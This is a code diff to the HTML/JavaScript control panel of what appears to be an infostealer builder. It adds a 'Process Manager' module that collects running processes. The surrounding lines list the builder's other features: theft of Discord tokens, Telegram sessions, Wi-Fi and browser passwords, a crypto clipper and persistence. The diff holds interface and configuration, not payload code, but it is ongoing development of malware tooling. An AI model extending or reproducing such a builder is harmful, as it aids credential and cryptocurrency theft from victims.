@@ -760,6 +760,28 @@
                             </div>
                         </div>
 
+
+                        <!-- PROCESS MANAGER MODULE -->
+                        <div class="module-card" id="module-process" data-module="process">
+                            <div class="module-header" onclick="toggleModule('process')">
+                                <div class="module-icon" style="background: rgba(0, 102, 255, 0.2); color: var(--info);">⚙️</div>
+                                <div class="module-title">
+                                    <h3>Process Manager</h3>
+                                    <p>Collect all running processes</p>
+                                </div>
+                                <div class="toggle-switch module-toggle" id="toggle-process"></div>
+                            </div>
+                            <div class="feature-list">
+                                <div class="feature-item" data-feature="process_manager" onclick="toggleFeature(event, 'process_manager')">
+                                    <div class="feature-checkbox"></div>
+                                    <div>
+                                        <div class="feature-name">Collect All Processes</div>
+                                        <div class="feature-desc">System & user processes with details</div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
                         <!-- MESSAGING MODULE -->
                         <div class="module-card" id="module-messaging" data-module="messaging">
                             <div class="module-header" onclick="toggleModule('messaging')">
@@ -1012,7 +1034,8 @@
             messaging: ['discord_token', 'telegram_session'],
             network: ['network_scan', 'wifi_passwords'],
             crypto: ['crypto_clipper'],
-            persistence: ['persistence']
+            persistence: ['persistence'],
+            process: ['process_manager']  
         };
 
         // Initialize dashboard
@@ -1326,6 +1349,7 @@
             const preview = document.getElementById('buildPreview');
             const items = [
                 { name: 'System Information', key: 'system_info' },
+                { name: 'Process Manager', key: 'process_manager' },
                 { name: 'Screenshot', key: 'screenshot' },
                 { name: 'Browser Passwords', key: 'browser_passwords' },
                 { name: 'Discord Tokens', key: 'discord_token' },
